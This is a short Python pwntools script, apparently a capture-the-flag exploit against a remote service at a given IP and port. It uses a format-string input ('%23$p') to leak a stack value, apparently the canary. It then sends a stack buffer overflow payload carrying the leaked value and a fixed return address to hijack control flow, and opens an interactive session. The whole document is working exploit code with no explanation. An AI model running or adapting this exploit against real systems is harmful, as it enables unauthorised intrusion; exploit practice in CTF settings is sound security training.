from pwn import *
import  time

context.log_level='debug'
#p = process('./1')
p = remote("220.249.52.133",'31545')
addr = 0x4008DE
sa = lambda x,y:p.sendafter(x,y)
sl = lambda x:p.sendline(x)
rl = lambda :p.recvline()

sa('battle \n','2\n')
sl('%23$p')
a = rl()
print(a)
sa('battle \n','1\n')
payload = 'A'*(0x90-0x8)+p64(int(a,16))+'aaaaaaaa'+p64(addr)
sl(payload)
p.interactive()
